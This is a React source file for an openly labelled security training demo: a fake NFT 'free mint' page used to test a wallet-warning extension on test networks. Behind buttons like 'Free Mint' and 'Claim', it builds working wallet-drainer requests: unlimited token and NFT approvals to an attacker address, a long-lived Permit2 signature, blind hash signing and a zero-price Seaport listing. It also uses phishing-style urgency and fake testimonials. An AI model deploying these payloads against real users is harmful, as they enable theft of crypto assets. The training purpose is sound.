import { useEffect, useMemo, useState } from "react";
import {
  encodeFunctionData,
  maxUint256,
  parseEther,
  toHex,
  zeroAddress,
  type Address,
  type Hex,
} from "viem";
import { useAccount, useConnect, useDisconnect } from "wagmi";

import { getDeployment } from "./addresses";
import { demoChain } from "./config";

const permit2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as Address;
const seaport = "0x0000000000000068f116a894984e2db1123eb395" as Address;
const sepoliaWeth = "0xfff9976782d46cc05630d1f6ebab18b2324d6b14" as Address;
const maxUint160 = (1n << 160n) - 1n;
const opaqueHash = `0x${"ff".repeat(32)}` as Hex;
const zeroHash = `0x${"00".repeat(32)}` as Hex;

const erc721ApprovalAbi = [
  {
    type: "function",
    name: "setApprovalForAll",
    stateMutability: "nonpayable",
    inputs: [
      { name: "operator", type: "address" },
      { name: "approved", type: "bool" },
    ],
    outputs: [],
  },
] as const;

const erc20ApprovalAbi = [
  {
    type: "function",
    name: "approve",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const;

const wethAbi = [
  {
    type: "function",
    name: "deposit",
    stateMutability: "payable",
    inputs: [],
    outputs: [],
  },
] as const;

type ActionId =
  | "free-mint"
  | "claim"
  | "verify"
  | "sign-in"
  | "wrap"
  | "sign-hash"
  | "list-zero";
type Outcomes = Partial<Record<ActionId, string>>;

interface ProviderRequest {
  method: string;
  params: unknown[];
}

interface DemoAction {
  id: ActionId;
  title: string;
  note: string;
  tone: "hot" | "ink" | "calm";
}

const primaryActions: DemoAction[] = [
  {
    id: "free-mint",
    title: "Free Mint",
    note: "Unlock your Demo Cat instantly",
    tone: "hot",
  },
  {
    id: "claim",
    title: "Claim 1000 CLAIM",
    note: "Bonus tokens for early wallets",
    tone: "hot",
  },
  {
    id: "verify",
    title: "Sign to verify wallet",
    note: "Gasless eligibility check",
    tone: "ink",
  },
  {
    id: "sign-in",
    title: "Sign in",
    note: "A normal SIWE login message",
    tone: "calm",
  },
  {
    id: "wrap",
    title: "Wrap 0.01 ETH",
    note: "Use the known WETH contract",
    tone: "calm",
  },
];

const moreActions: DemoAction[] = [
  {
    id: "sign-hash",
    title: "Sign hash",
    note: "Opaque personal_sign payload",
    tone: "ink",
  },
  {
    id: "list-zero",
    title: "List my NFT for 0",
    note: "Seaport 1.6 order for zero ETH",
    tone: "hot",
  },
];

const releaseZipUrl =
  "https://ess-cor.github.io/plainsign/plainsign-extension.zip";

export function App() {
  const { address, chainId, isConnected } = useAccount();
  const { connect, connectors, error: connectError, isPending: isConnecting } =
    useConnect();
  const { disconnect } = useDisconnect();
  const deployment = useMemo(() => getDeployment(demoChain.id), []);
  const [secondsLeft, setSecondsLeft] = useState(14 * 60 + 37);
  const [outcomes, setOutcomes] = useState<Outcomes>({});
  const [pending, setPending] = useState<ActionId>();
  const [networkError, setNetworkError] = useState<string>();
  const [localGas, setLocalGas] = useState<"funding" | "ready" | "failed">();
  const networkMismatch = isConnected && chainId !== demoChain.id;

  useEffect(() => {
    const timer = window.setInterval(
      () => setSecondsLeft((seconds) => (seconds > 0 ? seconds - 1 : 15 * 60)),
      1_000,
    );
    return () => window.clearInterval(timer);
  }, []);

  useEffect(() => {
    if (demoChain.id !== 31337 || !address || networkMismatch) return;
    let active = true;
    setLocalGas("funding");
    void ensureLocalGas(address).then(
      () => active && setLocalGas("ready"),
      () => active && setLocalGas("failed"),
    );
    return () => {
      active = false;
    };
  }, [address, networkMismatch]);

  const countdown = `${String(Math.floor(secondsLeft / 60)).padStart(2, "0")}:${String(
    secondsLeft % 60,
  ).padStart(2, "0")}`;

  async function switchNetwork(): Promise<void> {
    const provider = window.ethereum;
    if (!provider) {
      setNetworkError("Install or unlock MetaMask, then try again.");
      return;
    }
    setNetworkError(undefined);
    const chainHex = toHex(demoChain.id);
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: chainHex }],
      });
    } catch (error) {
      if (providerErrorCode(error) !== 4902 || demoChain.id !== 31337) {
        setNetworkError(errorMessage(error));
        return;
      }
      try {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: "0x7a69",
              chainName: "Hardhat Local",
              nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
              rpcUrls: ["http://127.0.0.1:8545"],
            },
          ],
        });
      } catch (addError) {
        setNetworkError(errorMessage(addError));
      }
    }
  }

  async function runAction(id: ActionId): Promise<void> {
    if (!address || !deployment || !window.ethereum) {
      setOutcomes((current) => ({
        ...current,
        [id]: "Connect a wallet before continuing.",
      }));
      return;
    }
    if (networkMismatch) {
      setOutcomes((current) => ({
        ...current,
        [id]: `Switch MetaMask to ${demoChain.name} first.`,
      }));
      return;
    }

    setPending(id);
    setOutcomes((current) => ({ ...current, [id]: "Waiting for your decision…" }));
    try {
      const request = buildRequest(id, address, deployment);
      const result = await window.ethereum.request(request);
      setOutcomes((current) => ({
        ...current,
        [id]: formatResult(result),
      }));
    } catch (error) {
      const code = providerErrorCode(error);
      setOutcomes((current) => ({
        ...current,
        [id]: code === 4001 ? "Rejected (4001)" : `Error: ${errorMessage(error)}`,
      }));
    } finally {
      setPending(undefined);
    }
  }

  const actionRows = (items: readonly DemoAction[]) =>
    items.map((action) => (
      <div className={`action-row action-${action.tone}`} key={action.id}>
        <button
          id={action.id}
          type="button"
          disabled={!isConnected || !deployment || pending !== undefined}
          onClick={() => void runAction(action.id)}
        >
          <span>{pending === action.id ? "Check your wallet…" : action.title}</span>
          <small>{action.note}</small>
        </button>
        <output
          className="action-outcome"
          data-testid={`${action.id}-outcome`}
          aria-live="polite"
        >
          {outcomes[action.id] || "No request yet"}
        </output>
      </div>
    ));

  return (
    <div className="site-shell">
      <aside className="demo-notice" aria-label="Security training demo">
        <strong>Security training demo — Sepolia / local test networks only.</strong>
        <span>
          This page deliberately requests risky approvals to demonstrate PlainSign.
          Use an empty test wallet and reject the example requests. Mint counts,
          countdowns and testimonials are fictional; there is no real offer.
        </span>
      </aside>
      <header className="site-header">
        <a className="brand" href="#top" aria-label="CatDrop home">
          <span className="brand-mark">CD</span>
          CatDrop
        </a>
        <div className="wallet-controls">
          <span className="chain-pill">{demoChain.name}</span>
          {isConnected ? (
            <button className="wallet-button" type="button" onClick={() => disconnect()}>
              {shortAddress(address)}
            </button>
          ) : (
            <button
              className="wallet-button"
              id="connect-wallet"
              type="button"
              disabled={isConnecting || connectors.length === 0}
              onClick={() => connectors[0] && connect({ connector: connectors[0] })}
            >
              {isConnecting ? "Connecting…" : "Connect wallet"}
            </button>
          )}
        </div>
      </header>

      {networkMismatch && (
        <section className="network-banner" role="alert">
          <span>Switch MetaMask to {demoChain.name}</span>
          <button type="button" onClick={() => void switchNetwork()}>
            Switch network
          </button>
        </section>
      )}
      {(networkError || connectError) && (
        <p className="connection-error" role="alert">
          {networkError || connectError?.message}
        </p>
      )}

      <main className="drop-layout" id="top">
        <section className="hero-copy">
          <div className="rush-strip">
            <span>Mint closes in</span>
            <strong>{countdown}</strong>
          </div>
          <p className="social-proof">Fictional example: 1,204 minted today</p>
          <h1>Free cats.<br />Right meow.</h1>
          <p className="hero-lede">
            The most exclusive cat collection nobody asked for. Connect now and
            claim before this extremely real timer runs out.
          </p>
          <div className="cat-ticket" aria-hidden="true">
            <span className="ticket-number">#0001</span>
            <span className="cat-face">🐈</span>
            <strong>Demo Cat</strong>
            <small>Definitely rare</small>
          </div>
          <blockquote>
            “I clicked mint and now my cat owns the house.”
            <cite>— cryptokittyking.eth</cite>
          </blockquote>
        </section>

        <section className="action-panel" aria-labelledby="claim-title">
          <div className="panel-heading">
            <span className="live-dot" aria-hidden="true" />
            <div>
              <p>Wallet eligibility live</p>
              <h2 id="claim-title">Claim your drop</h2>
            </div>
          </div>

          {!deployment && (
            <p className="deployment-warning" role="alert">
              No deployment found for chain {demoChain.id}. Run the local demo command.
            </p>
          )}

          <div className="action-list">
            {actionRows(primaryActions)}
          </div>

          <details className="more-tests">
            <summary>
              <span>More tests</span>
              <small>2 signature checks</small>
            </summary>
            <div className="action-list action-list-more">
              {actionRows(moreActions)}
            </div>
          </details>

          <p className="fine-print">
            Three core requests are intentionally dangerous; two are safe. Both extra
            signature tests are dangerous. PlainSign should tell you which is which
            before MetaMask opens.
          </p>
          {isConnected && demoChain.id === 31337 && (
            <p className={`local-gas local-gas-${localGas ?? "funding"}`} aria-live="polite">
              {localGas === "ready"
                ? "Local demo gas ready"
                : localGas === "failed"
                  ? "Local gas funding failed — restart the demo command"
                  : "Funding this wallet with local-only demo ETH…"}
            </p>
          )}
        </section>
      </main>

      <section className="testimonials" aria-label="Fictional testimonials for the security demo">
        <p>“No roadmap. No utility. Perfect.” <span>— jpegfan420</span></p>
        <p>“The countdown restarted, so I knew it was legit.” <span>— 0xDiamondHands</span></p>
        <p>“Five stars. Still waiting for the cat.” <span>— mintmaxi</span></p>
      </section>
      <footer className="site-footer">
        <a href="./review.html">Explore sample verdicts without a wallet</a>
        <span>Want to test the guardrail?</span>
        <a href={releaseZipUrl}>Download the PlainSign extension (.zip)</a>
      </footer>
    </div>
  );
}

function buildRequest(
  id: ActionId,
  account: Address,
  deployment: NonNullable<ReturnType<typeof getDeployment>>,
): ProviderRequest {
  if (id === "free-mint") {
    return transactionRequest(account, deployment.DemoNFT, encodeFunctionData({
      abi: erc721ApprovalAbi,
      functionName: "setApprovalForAll",
      args: [deployment.attacker, true],
    }));
  }
  if (id === "claim") {
    return transactionRequest(account, deployment.ClaimToken, encodeFunctionData({
      abi: erc20ApprovalAbi,
      functionName: "approve",
      args: [deployment.attacker, maxUint256],
    }));
  }
  if (id === "verify") {
    const expiration = Math.floor(Date.now() / 1_000) + 10 * 365 * 24 * 60 * 60;
    const typedData = {
      domain: {
        name: "Permit2",
        chainId: demoChain.id,
        verifyingContract: permit2,
      },
      primaryType: "PermitSingle",
      types: {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" },
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" },
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" },
        ],
      },
      message: {
        details: {
          token: deployment.ClaimToken,
          amount: maxUint160.toString(),
          expiration,
          nonce: 0,
        },
        spender: deployment.attacker,
        sigDeadline: expiration,
      },
    };
    return {
      method: "eth_signTypedData_v4",
      params: [account, JSON.stringify(typedData)],
    };
  }
  if (id === "sign-in") {
    const message = [
      `${window.location.hostname} wants you to sign in with your Ethereum account:`,
      account,
      "",
      "Sign in to preview your Demo Cat.",
      "",
      `URI: ${window.location.origin}`,
      "Version: 1",
      `Chain ID: ${demoChain.id}`,
      `Nonce: ${crypto.randomUUID().replaceAll("-", "").slice(0, 8)}`,
      `Issued At: ${new Date().toISOString()}`,
    ].join("\n");
    return { method: "personal_sign", params: [toHex(message), account] };
  }
  if (id === "sign-hash") {
    return { method: "personal_sign", params: [opaqueHash, account] };
  }
  if (id === "list-zero") {
    const now = Math.floor(Date.now() / 1_000);
    const typedData = {
      domain: {
        name: "Seaport",
        version: "1.6",
        chainId: demoChain.id,
        verifyingContract: seaport,
      },
      primaryType: "OrderComponents",
      types: {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "version", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" },
        ],
        OfferItem: [
          { name: "itemType", type: "uint8" },
          { name: "token", type: "address" },
          { name: "identifierOrCriteria", type: "uint256" },
          { name: "startAmount", type: "uint256" },
          { name: "endAmount", type: "uint256" },
        ],
        ConsiderationItem: [
          { name: "itemType", type: "uint8" },
          { name: "token", type: "address" },
          { name: "identifierOrCriteria", type: "uint256" },
          { name: "startAmount", type: "uint256" },
          { name: "endAmount", type: "uint256" },
          { name: "recipient", type: "address" },
        ],
        OrderComponents: [
          { name: "offerer", type: "address" },
          { name: "zone", type: "address" },
          { name: "offer", type: "OfferItem[]" },
          { name: "consideration", type: "ConsiderationItem[]" },
          { name: "orderType", type: "uint8" },
          { name: "startTime", type: "uint256" },
          { name: "endTime", type: "uint256" },
          { name: "zoneHash", type: "bytes32" },
          { name: "salt", type: "uint256" },
          { name: "conduitKey", type: "bytes32" },
          { name: "counter", type: "uint256" },
        ],
      },
      message: {
        offerer: account,
        zone: zeroAddress,
        offer: [
          {
            itemType: 2,
            token: deployment.DemoNFT,
            identifierOrCriteria: "1",
            startAmount: "1",
            endAmount: "1",
          },
        ],
        consideration: [
          {
            itemType: 0,
            token: zeroAddress,
            identifierOrCriteria: "0",
            startAmount: "0",
            endAmount: "0",
            recipient: account,
          },
        ],
        orderType: 0,
        startTime: now,
        endTime: now + 30 * 24 * 60 * 60,
        zoneHash: zeroHash,
        salt: Date.now().toString(),
        conduitKey: zeroHash,
        counter: "0",
      },
    };
    return {
      method: "eth_signTypedData_v4",
      params: [account, JSON.stringify(typedData)],
    };
  }
  const wethAddress =
    deployment.WETH9 ?? (demoChain.id === 11155111 ? sepoliaWeth : undefined);
  if (!wethAddress) throw new Error(`WETH is not configured on chain ${demoChain.id}.`);
  return transactionRequest(
    account,
    wethAddress,
    encodeFunctionData({ abi: wethAbi, functionName: "deposit" }),
    toHex(parseEther("0.01")),
  );
}

function transactionRequest(
  from: Address,
  to: Address,
  data: Hex,
  value?: Hex,
): ProviderRequest {
  return {
    method: "eth_sendTransaction",
    params: [{ from, to, data, ...(value ? { value } : {}) }],
  };
}

function formatResult(result: unknown): string {
  if (typeof result === "string") return result;
  return JSON.stringify(result);
}

function providerErrorCode(error: unknown): number | undefined {
  if (typeof error !== "object" || error === null) return undefined;
  if ("code" in error && typeof error.code === "number") return error.code;
  if ("cause" in error) return providerErrorCode(error.cause);
  return undefined;
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}

function shortAddress(address: Address | undefined): string {
  return address ? `${address.slice(0, 6)}…${address.slice(-4)}` : "Connected";
}

async function ensureLocalGas(address: Address): Promise<void> {
  const rawBalance = await localRpc("eth_getBalance", [address, "latest"]);
  if (typeof rawBalance !== "string") throw new Error("Hardhat returned an invalid balance.");
  const balance = BigInt(rawBalance);
  if (balance >= parseEther("1")) return;
  const accounts = (await localRpc("eth_accounts", [])) as Address[];
  if (!accounts[0]) throw new Error("Hardhat did not expose an unlocked funding account.");
  await localRpc("eth_sendTransaction", [
    {
      from: accounts[0],
      to: address,
      value: toHex(parseEther("10")),
    },
  ]);
}

async function localRpc(method: string, params: unknown[]): Promise<unknown> {
  const response = await fetch("http://127.0.0.1:8545", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: Date.now(), method, params }),
  });
  if (!response.ok) throw new Error(`Hardhat RPC returned ${response.status}.`);
  const payload = (await response.json()) as { result?: unknown; error?: { message?: string } };
  if (payload.error) throw new Error(payload.error.message || "Hardhat RPC request failed.");
  return payload.result;
}
